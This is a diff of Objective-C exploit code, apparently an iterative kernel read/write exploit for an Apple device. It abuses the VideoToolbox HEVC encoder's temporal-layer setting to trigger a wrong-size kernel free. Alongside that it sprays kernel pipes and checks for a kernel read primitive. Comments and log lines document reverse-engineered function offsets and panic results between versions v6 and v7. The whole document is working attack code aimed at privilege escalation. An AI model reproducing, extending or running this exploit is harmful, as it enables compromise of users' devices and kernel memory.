@@ -8,9 +8,15 @@
 //      queue_init(this+0x58) and queue_init(this+0x78)
 //      then kfree(this+0x50, *(uint32*)(this+0x48) << 5)
 //  Nov 1 panics: this=1, FAR=0x59 = failed alloc, NULL-page write.
-//  v6 law: Prepare with N=8 (real pool) THEN Set 16463 THEN encode
-//  THEN invalidate so the destructor runs on a live object whose count
-//  may be the overshoot (wrong-size free of count<<5).
+//  v6: Prepare N=8 then Set 16463 then encode. IPS 10:04/13:45-13:55
+//  still this=1 FAR=0x59 at invalidate — Prepare did not store a heap
+//  pool. Ghidra FUN_fffffe0008790cec: kalloc+ctor then init(count);
+//  FUN_fffffe00087913b4 invalidate: if (pool) dtor(pool). this=1
+//  passes the NULL check. v7: Encode >=1 frame AT N=8 FIRST so
+//  ctx+0x147b0 is a real kalloc, THEN Set 16463 (re-init: dtor of
+//  the live object then init with the overshoot count), THEN encode
+//  again, THEN invalidate. kfree(this+0x50, count<<5) only runs on
+//  a heap this.
 //
 //  Neighbor = kernel pipes (default 16KB), unique markers, held for the
 //  whole tap, plus a catch spray after invalidate. Metal 0x4000 (p145)
@@ -41,7 +47,7 @@
 #import <unistd.h>
 #import <errno.h>
 
-#define P149_BUILD     @"p149-t8150krw-v2"
+#define P149_BUILD     @"p149-t8150krw-v3"
 #define P149_KEY       @"NumberOfTemporalLayers"
 #define P149_PRE       8
 #define P149_OVER      16463
@@ -135,12 +141,13 @@ static long p149_layers_knob(NSString *docs) {
 
     Lf(@"=== p149 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P149_BUILD);
     Lf(@"%@", [LabDeviceProfile identBlock]);
-    L(@"[law] 17 conversion: Prepare N=8 (real AVE Surface Pool) THEN");
-    L(@"  Set NumberOfTemporalLayers=16463 THEN encode THEN invalidate.");
-    L(@"  Ghidra: dtor FUN_fffffe0008840fec queue_init(this+0x58) then");
-    L(@"  kfree(this+0x50, count<<5) with count at this+0x48.");
-    L(@"  Nov 1 this=1 FAR=0x59 = failed alloc. Prepare-first is the");
-    L(@"  real-context door. Neighbor = kernel pipes, not Metal.");
+    L(@"[law] 17 conversion v7: Prepare N=8 THEN encode >=1 frame");
+    L(@"  (Ghidra FUN_fffffe0008790cec kalloc+ctor stores heap this at");
+    L(@"  ctx+0x147b0) THEN Set 16463 (re-init: dtor live object, init");
+    L(@"  count<<5) THEN encode THEN invalidate (FUN_fffffe00087913b4");
+    L(@"  dtor if pool!=0). IPS 13:45-13:55 this=1 FAR=0x59 = sentinel");
+    L(@"  passed the NULL check; kfree(this+0x50, count<<5) needs a");
+    L(@"  heap this. Neighbor = kernel pipes, not Metal.");
     L(@"[!] PANIC-POSSIBLE. ONE tap per force-quit. Reboot after.");
     L(@"[honesty] PIPE-HIT / QUEUE-INIT / kptr = write receipt.");
     L(@"  hasKread only on kread32(kbase)==0xfeedfacf.");
@@ -148,7 +155,7 @@ static long p149_layers_knob(NSString *docs) {
     long pre = p149_read_knob(docs, @"p142_pre.txt", P149_PRE);
     if (pre < 1 || pre > 8) pre = P149_PRE;
     long layers = p149_layers_knob(docs);
-    Lf(@"[*] knobs: pre=%ld (Prepare) layers=%ld (overshoot after Prepare)",
+    Lf(@"[*] knobs: pre=%ld (encode-first) layers=%ld (overshoot after encode)",
        pre, layers);
 
     /* ---- stage 1: kernel pipe spray (held) ---- */
@@ -187,7 +194,7 @@ static long p149_layers_knob(NSString *docs) {
     Lf(@"[s1] spray HELD: %d/%d kernel pipes x 0x%x (released at tap end)",
        npipe, P149_PIPES, (unsigned)P149_BUFLEN);
 
-    /* ---- stage 2: Prepare-first then overshoot (the v6 law) ---- */
+    /* ---- stage 2: encode-first then overshoot (the v7 law) ---- */
     VTCompressionSessionRef session = NULL;
     OSStatus st = VTCompressionSessionCreate(
         kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
@@ -224,7 +231,31 @@ static long p149_layers_knob(NSString *docs) {
     }
 
     st = VTCompressionSessionPrepareToEncodeFrames(session);
-    Lf(@"[2b] Prepare st=%d (real Surface Pool; this must not be 1)", (int)st);
+    Lf(@"[2b] Prepare st=%d", (int)st);
+
+    CVPixelBufferRef pb = NULL;
+    st = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
+                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
+                             NULL, &pb);
+    if (st != noErr || !pb) {
+        Lf(@"[-] CVPixelBufferCreate failed: %d", (int)st);
+        VTCompressionSessionInvalidate(session); CFRelease(session);
+        for (int i = 0; i < npipe; i++) { close(rfd[i]); close(wfd[i]); }
+        free(page);
+        p149_bandit("nopb"); return P149R();
+    }
+
+    /* v7: encode AT N=8 first so FUN_8790cec kalloc+ctor stores a heap
+       this at ctx+0x147b0. v6 Set-16463-then-encode left this=1. */
+    OSStatus firstSt = 0;
+    for (int i = 0; i < 2; i++) {
+        VTEncodeInfoFlags flags = 0;
+        OSStatus est = VTCompressionSessionEncodeFrame(session, pb,
+            CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &flags);
+        if (i == 0) firstSt = est;
+        if (est != 0) break;
+    }
+    Lf(@"[2e] ENCODE N=%ld (materialize pool) first st=%d", pre, (int)firstSt);
 
     int32_t lay32 = (int32_t)layers;
     CFNumberRef layVal = CFNumberCreate(kCFAllocatorDefault,
@@ -251,28 +282,16 @@ static long p149_layers_knob(NSString *docs) {
         }
     }
 
-    CVPixelBufferRef pb = NULL;
-    st = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
-                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
-                             NULL, &pb);
-    if (st != noErr || !pb) {
-        Lf(@"[-] CVPixelBufferCreate failed: %d", (int)st);
-        VTCompressionSessionInvalidate(session); CFRelease(session);
-        for (int i = 0; i < npipe; i++) { close(rfd[i]); close(wfd[i]); }
-        free(page);
-        p149_bandit("nopb"); return P149R();
-    }
-
-    OSStatus firstSt = 0;
-    for (int i = 0; i < 4; i++) {
+    OSStatus overSt = 0;
+    for (int i = 2; i < 4; i++) {
         VTEncodeInfoFlags flags = 0;
         OSStatus est = VTCompressionSessionEncodeFrame(session, pb,
             CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &flags);
-        if (i == 0) firstSt = est;
-        if (i == 0) L(@"[3] ENCODE[0] = overshoot on a prepared context (IN FLIGHT)");
+        if (i == 2) overSt = est;
+        if (i == 2) L(@"[3] ENCODE overshoot on a materialized pool (IN FLIGHT)");
         if (est != 0) break;
     }
-    Lf(@"[3] battery returned; first st=%d", (int)firstSt);
+    Lf(@"[3] overshoot encode first st=%d", (int)overSt);
     VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
     CVPixelBufferRelease(pb);
 
